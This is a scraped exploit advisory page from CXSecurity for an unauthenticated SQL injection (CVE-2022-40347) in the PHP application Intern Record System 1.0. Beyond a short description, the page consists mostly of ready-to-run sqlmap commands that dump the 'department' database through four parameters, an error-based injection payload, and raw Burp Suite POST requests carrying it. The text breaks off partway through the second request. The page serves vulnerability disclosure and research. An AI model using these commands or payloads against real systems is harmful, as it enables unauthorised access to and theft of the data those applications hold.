---
title: Intern Record System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023040026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-07
fetch_date: 2025-10-04T11:29:11.619546
---

# Intern Record System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Intern Record System 1.0 SQL Injection** **2023.04.06**  Credit:  **[Hamdi Sevben](https://cxsecurity.com/author/Hamdi%2BSevben/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-40347](https://cxsecurity.com/cveshow/CVE-2022-40347/ "Click to see CVE-2022-40347")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Intern Record System v1.0 - SQL Injection (Unauthenticated)
# Date: 2022-06-09
# Exploit Author: Hamdi Sevben
# Vendor Homepage: https://code-projects.org/intern-record-system-in-php-with-source-code/
# Software Link: https://download-media.code-projects.org/2020/03/Intern\_Record\_System\_In\_PHP\_With\_Source\_Code.zip
# Version: 1.0
# Tested on: Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
# CVE: CVE-2022-40347
# References:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40347
https://github.com/h4md153v63n/CVE-2022-40347\_Intern-Record-System-phone-V1.0-SQL-Injection-Vulnerability-Unauthenticated
------------------------------------------------------------------------------------
1. Description:
----------------------
Intern Record System 1.0 allows SQL Injection via parameters 'phone', 'email', 'deptType' and 'name' in /intern/controller.php
Exploiting this issue could allow an attacker to compromise the application, access or modify data,
or exploit latest vulnerabilities in the underlying database.
2. Proof of Concept:
----------------------
In sqlmap use 'phone', 'email', 'deptType' or 'name' parameter to dump 'department' database.
Then run SQLmap to extract the data from the database:
sqlmap.py -u "http://localhost/intern/controller.php" -p "deptType" --risk="3" --level="3" --method="POST" --data="phone=&email=&deptType=test&name=" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" --headers="Host:localhost\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8\nAccept-Encoding:gzip, deflate\nAccept-Language:en-us,en;q=0.5\nCache-Control:no-cache\nContent-Type:application/x-www-form-urlencoded\nReferer:http://localhost/intern/" --dbms="MySQL" --batch --dbs -D department --dump
sqlmap.py -u "http://localhost/intern/controller.php" -p "email" --risk="3" --level="3" --method="POST" --data="phone=&email=test&deptType=3&name=" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" --headers="Host:localhost\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8\nAccept-Encoding:gzip, deflate\nAccept-Language:en-us,en;q=0.5\nCache-Control:no-cache\nContent-Type:application/x-www-form-urlencoded\nReferer:http://localhost/intern/" --dbms="MySQL" --batch --dbs -D department --dump
sqlmap.py -u "http://localhost/intern/controller.php" -p "name" --risk="3" --level="3" --method="POST" --data="phone=&email=&deptType=3&name=test" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" --headers="Host:localhost\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8\nAccept-Encoding:gzip, deflate\nAccept-Language:en-us,en;q=0.5\nCache-Control:no-cache\nContent-Type:application/x-www-form-urlencoded\nReferer:http://localhost/intern/" --dbms="MySQL" --batch --dbs -D department --dump
sqlmap.py -u "http://localhost/intern/controller.php" -p "phone" --risk="3" --level="3" --method="POST" --data="phone=test&email=&deptType=3&name=" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" --headers="Host:localhost\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8\nAccept-Encoding:gzip, deflate\nAccept-Language:en-us,en;q=0.5\nCache-Control:no-cache\nContent-Type:application/x-www-form-urlencoded\nReferer:http://localhost/intern/" --dbms="MySQL" --batch --dbs -D department --dump
3. Example payload:
----------------------
-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(\*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)\*2))x+FROM+INFORMATION\_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27
4. Burpsuite request on 'phone' parameter:
----------------------
POST /intern/controller.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 317
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/intern/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
phone=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(\*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)\*2))x+FROM+INFORMATION\_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27&email=&deptType=3&name=
5. Burpsuite request on 'email' parameter:
----------------------
POST /intern/controller.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 317
Content-Type: application/x-www-form-urlencoded
Referer: http://localhost/intern/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
phone=&email=-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(\*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)\*2))x+FROM+INFORMATION\_SCHEMA.C...